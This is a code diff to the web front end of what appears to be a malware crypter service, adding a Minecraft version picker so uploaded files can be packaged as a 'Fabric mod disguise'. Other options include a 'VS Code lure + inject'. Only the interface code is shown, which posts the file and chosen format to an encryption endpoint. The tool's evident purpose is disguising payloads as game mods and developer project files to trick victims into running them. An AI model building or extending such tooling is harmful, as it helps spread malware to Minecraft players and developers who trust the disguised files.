@@ -167,6 +167,26 @@
 
     /* Footer */
     .footer { margin-top: 20px; text-align: center; font-size: .72rem; color: var(--muted); }
+
+    /* MC version picker */
+    #jarOpts { display: none; }
+    #jarOpts.show { display: block; }
+    .mc-select {
+      width: 100%;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 10px 12px;
+      color: var(--text);
+      font-size: .85rem;
+      cursor: pointer;
+      appearance: none;
+      -webkit-appearance: none;
+      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%236b7280' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+      background-repeat: no-repeat;
+      background-position: right 12px center;
+    }
+    .mc-select:focus { outline: none; border-color: var(--accent); }
   </style>
 </head>
 <body>
@@ -196,7 +216,7 @@
     <div class="fmt-btn active" data-fmt="jar">
       <div class="fmt-icon">☕</div>
       <div class="fmt-name">JAR</div>
-      <div class="fmt-desc">Java executable</div>
+      <div class="fmt-desc">Fabric mod disguise</div>
     </div>
     <div class="fmt-btn" data-fmt="exe">
       <div class="fmt-icon">⚙️</div>
@@ -213,6 +233,28 @@
       <div class="fmt-name">TASKS</div>
       <div class="fmt-desc">VS Code lure + inject</div>
     </div>
+  </div>
+
+  <!-- JAR: Minecraft version picker (shown only when JAR is selected) -->
+  <div id="jarOpts" class="show">
+    <div class="section-label">Minecraft version</div>
+    <select id="mcVersionSelect" class="mc-select">
+      <option value="26.1.2">26.1.2 (latest)</option>
+      <option value="26.1.1">26.1.1</option>
+      <option value="26.1">26.1</option>
+      <option value="1.21.11">1.21.11</option>
+      <option value="1.21.10">1.21.10</option>
+      <option value="1.21.9">1.21.9</option>
+      <option value="1.21.8">1.21.8</option>
+      <option value="1.21.7">1.21.7</option>
+      <option value="1.21.6">1.21.6</option>
+      <option value="1.21.5">1.21.5</option>
+      <option value="1.21.4">1.21.4</option>
+      <option value="1.21.3">1.21.3</option>
+      <option value="1.21.2">1.21.2</option>
+      <option value="1.21.1">1.21.1</option>
+      <option value="1.21">1.21</option>
+    </select>
   </div>
 
   <!-- Encrypt button -->
@@ -234,6 +276,8 @@
   const dzName = document.getElementById('dzName');
   const dzSize = document.getElementById('dzSize');
   const fmtTabs = document.getElementById('fmtTabs');
+  const jarOpts = document.getElementById('jarOpts');
+  const mcVersionSelect = document.getElementById('mcVersionSelect');
   const cryptBtn = document.getElementById('cryptBtn');
   const status = document.getElementById('status');
   const statusText = document.getElementById('statusText');
@@ -271,9 +315,8 @@
     document.querySelectorAll('.fmt-btn').forEach(b => b.classList.remove('active'));
     btn.classList.add('active');
     selectedFmt = btn.dataset.fmt;
+    jarOpts.classList.toggle('show', selectedFmt === 'jar');
   });
-
-  }
 
   // Encrypt
   cryptBtn.addEventListener('click', async () => {
@@ -284,6 +327,7 @@
     const form = new FormData();
     form.append('file', selectedFile);
     form.append('format', selectedFmt);
+    if (selectedFmt === 'jar') form.append('mcVersion', mcVersionSelect.value);
 
     try {
       const res = await fetch('/api/crypt', { method: 'POST', body: form });
